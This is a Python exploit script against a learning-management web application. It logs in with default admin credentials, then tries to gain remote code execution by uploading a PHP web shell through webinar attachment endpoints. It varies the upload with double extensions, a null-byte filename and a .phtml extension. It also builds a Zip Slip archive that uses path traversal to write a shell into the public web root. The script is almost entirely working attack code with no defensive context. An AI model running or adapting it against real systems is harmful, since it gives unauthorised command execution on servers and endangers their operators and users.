import requests
import re
import zipfile
import io
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def exploit_webinar_files():
    """Try to upload shell via webinar file attachment"""
    print("\n[*] Attempting RCE via Webinar File Attachment...")
    
    # Get list of webinars
    r = session.get(f"{BASE_URL}/panel/webinars")
    
    # Find webinar IDs
    webinar_ids = re.findall(r'/panel/webinars/(\d+)', r.text)
    webinar_ids = list(set(webinar_ids))
    
    if not webinar_ids:
        print("[-] No webinars found. Creating one...")
        # Try to create a webinar
        csrf, _ = get_csrf(f"{BASE_URL}/panel/webinars/create")
        if csrf:
            data = {
                '_token': csrf,
                'type': 'webinar',
                'title': 'Test Webinar RCE',
                'category_id': '1'
            }
            r = session.post(f"{BASE_URL}/panel/webinars/store", data=data)
            webinar_ids = re.findall(r'/panel/webinars/(\d+)', r.text)
    
    print(f"[*] Found webinars: {webinar_ids[:3]}")
    
    for wid in webinar_ids[:3]:
        print(f"\n[*] Testing webinar ID: {wid}")
        
        # Try file attachment upload
        # Common endpoints for file uploads in webinars
        upload_endpoints = [
            f"/panel/files/store",
            f"/panel/webinars/{wid}/files/store",
            f"/panel/webinars/{wid}/chapters/store",
        ]
        
        # Create shell payload
        shell_php = b"<?php system($_GET['c']); ?>"
        
        for endpoint in upload_endpoints:
            try:
                csrf, page = get_csrf(f"{BASE_URL}/panel/webinars/{wid}/edit")
                
                # Try multiple upload strategies
                strategies = [
                    # Strategy 1: Direct PHP upload
                    {
                        'files': {'file': ('shell.php', shell_php, 'application/x-php')},
                        'data': {'_token': csrf, 'webinar_id': wid}
                    },
                    # Strategy 2: Double extension
                    {
                        'files': {'file': ('shell.php.jpg', shell_php, 'image/jpeg')},
                        'data': {'_token': csrf, 'webinar_id': wid}
                    },
                    # Strategy 3: Null byte (older PHP)
                    {
                        'files': {'file': ('shell.php%00.jpg', shell_php, 'image/jpeg')},
                        'data': {'_token': csrf, 'webinar_id': wid}
                    },
                    # Strategy 4: .phtml extension
                    {
                        'files': {'file': ('shell.phtml', shell_php, 'text/plain')},
                        'data': {'_token': csrf, 'webinar_id': wid}
                    }
                ]
                
                for i, strat in enumerate(strategies):
                    r = session.post(f"{BASE_URL}{endpoint}", files=strat['files'], data=strat['data'])
                    print(f"    [{endpoint}] Strategy {i+1}: Status {r.status_code}")
                    
                    if r.status_code in [200, 201]:
                        # Try to find uploaded file URL in response
                        urls = re.findall(r'(https?://[^\s"\']+\.php[^\s"\']*)', r.text)
                        for url in urls:
                            try:
                                check = session.get(url + "?c=id")
                                if "uid=" in check.text:
                                    print(f"\n[!!!] RCE SUCCESS! Shell: {url}")
                                    return True
                            except:
                                pass
                                
            except Exception as e:
                print(f"    Error: {e}")
    
    return False

def exploit_chapters_zip():
    """Try to upload ZIP file for course chapters"""
    print("\n[*] Attempting RCE via Chapter ZIP Upload (Alternative)...")
    
    # Get webinars
    r = session.get(f"{BASE_URL}/panel/webinars")
    webinar_ids = list(set(re.findall(r'/panel/webinars/(\d+)', r.text)))
    
    if not webinar_ids:
        print("[-] No webinars found")
        return False
    
    # Create malicious ZIP with Zip Slip
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as z:
        shell = "<?php system($_GET['c']); ?>"
        # Multiple traversal depths
        for depth in [3, 4, 5, 6, 7]:
            path = "../" * depth + "public/rce_chapter.php"
            z.writestr(path, shell)
    zip_buffer.seek(0)
    
    for wid in webinar_ids[:2]:
        print(f"\n[*] Testing chapter upload for webinar {wid}")
        
        csrf, _ = get_csrf(f"{BASE_URL}/panel/webinars/{wid}/edit")
        
        # Try chapter file upload
        endpoints = [
            f"/panel/chapters/store",
            f"/panel/webinars/{wid}/chapters/store",
            f"/panel/files/store"
        ]
        
        for endpoint in endpoints:
            try:
                files = {'file': ('chapters.zip', zip_buffer, 'application/zip')}
                data = {
                    '_token': csrf,
                    'webinar_id': wid,
                    'title': 'Test Chapter',
                    'type': 'file'
                }
                
                r = session.post(f"{BASE_URL}{endpoint}", files=files, data=data)
                print(f"    {endpoint}: Status {r.status_code}")
                
                if r.status_code in [200, 201]:
                    time.sleep(1)
                    # Check if shell extracted
                    check = session.get(f"{BASE_URL}/rce_chapter.php?c=id")
                    if "uid=" in check.text:
                        print(f"\n[!!!] RCE SUCCESS via ZIP Slip!")
                        print(f"[!!!] Shell: {BASE_URL}/rce_chapter.php")
                        return True
                        
            except Exception as e:
                print(f"    Error: {e}")
                
        zip_buffer.seek(0)
    
    return False

def main():
    if not login():
        return
    
    if exploit_webinar_files():
        return
    
    if exploit_chapters_zip():
        return
    
    print("\n[-] All webinar-based RCE attempts failed.")
    print("[*] Target appears to have strong file upload protections.")

if __name__ == "__main__":
    main()
